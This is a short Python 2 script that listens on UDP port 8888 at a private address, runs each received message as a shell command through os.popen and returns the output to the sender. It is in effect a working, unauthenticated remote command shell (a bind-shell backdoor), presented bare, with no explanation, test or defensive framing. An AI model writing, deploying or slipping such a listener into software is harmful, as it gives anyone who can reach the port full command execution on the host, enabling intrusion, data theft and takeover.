#!/usr/bin/python2

import socket,os


# 			IP4		UDP
s= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



ip= "192.168.10.199"

port=8888

s.bind((ip,port))
while True:
	# data receive from client
	data=s.recvfrom(102400)
	'''
	#print ("receive from client: " + data[0])
	'''

	cmd= os.popen(data[0])
	command = cmd.read()
	
	# sending command o/p to client
	s.sendto(command,data[1])
